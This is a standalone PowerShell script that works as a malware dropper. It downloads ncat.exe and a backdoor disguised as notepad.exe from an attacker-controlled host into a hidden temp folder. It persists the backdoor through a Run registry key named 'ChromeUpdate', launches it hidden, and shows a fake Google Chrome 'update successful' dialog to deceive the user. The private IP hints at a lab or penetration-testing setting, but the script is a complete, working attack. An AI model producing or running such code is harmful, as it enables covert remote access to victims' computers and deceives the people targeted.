$HiddenDirPath = "$env:TEMP\Notepad" 
$NcatUrl = "http://192.168.49.1/payload/ncat.exe" 
$BackdoorUrl = "http://192.168.49.1/payload/notepad.exe"
$BackdoorLocalPath = Join-Path $HiddenDirPath "notepad.exe"
$NcatLocalPath = Join-Path $HiddenDirPath "ncat.exe"

try {
    if (-not (Test-Path $HiddenDirPath)) {
        New-Item -Path $HiddenDirPath -ItemType Directory | Out-Null
        (Get-Item $HiddenDirPath).Attributes = "Hidden" 
    }
    (New-Object System.Net.WebClient).DownloadFile($NcatUrl, $NcatLocalPath)
    (New-Object System.Net.WebClient).DownloadFile($BackdoorUrl, $BackdoorLocalPath)
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $EntryName = "ChromeUpdate"
    $CommandToRun = "`"$BackdoorLocalPath`" --no-startup-window --win-session-start"
    
    Set-ItemProperty -Path $RegistryPath -Name $EntryName -Value $CommandToRun
    
    # Run immediately
    Start-Sleep -Seconds 5
    Start-Process -WindowStyle Hidden -FilePath $BackdoorLocalPath

    # Show Dialog

    Add-Type -AssemblyName System.Windows.Forms
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Google Chrome"
    $form.Size = New-Object System.Drawing.Size(300,150)
    $form.StartPosition = "CenterScreen"

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Update Successfully. Enjoy the new features!"
    $label.AutoSize = $true
    $label.Location = New-Object System.Drawing.Point(30,30)
    $form.Controls.Add($label)

    $button = New-Object System.Windows.Forms.Button
    $button.Text = "OK"
    $button.Location = New-Object System.Drawing.Point(100,70)
    $button.Add_Click({ $form.Close() })
    $form.Controls.Add($button)

    $form.ShowDialog()
}
catch {
    # None
}